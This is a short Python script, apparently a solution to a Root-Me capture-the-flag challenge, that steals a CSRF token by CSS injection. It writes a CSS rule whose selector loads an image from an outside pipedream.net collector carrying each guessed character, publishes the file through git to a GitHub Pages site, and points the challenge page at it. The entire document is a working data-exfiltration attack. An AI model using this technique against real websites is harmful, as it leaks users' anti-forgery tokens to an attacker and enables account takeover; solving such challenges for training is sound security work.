from time import sleep
import requests
import os

def build_css(chars):
    # supp du file
    os.remove("./a.css")

    # création du new file
    file = open("./a.css", "w") 
    file.write("input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/"+chars+") }") 
    file.close()

# ----
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
know  = ""

# envoie à admin 


while 1:
    for elt in chars:
        print("eeeeeeeeeeeeeeeeeeeeeeeeeeeee : "+elt)
        # new css
        build_css(know+elt)
        sleep(1) # for not to ban

        # commit & push
        os.system('git add .')
        os.system('git commit -m "update css"')
        os.system('git push')

        # request
        requests.get("http://challenge01.root-me.org:58005/?style=https://kixisaleesd.github.io/test/a")


    know += input("new chars to know : ")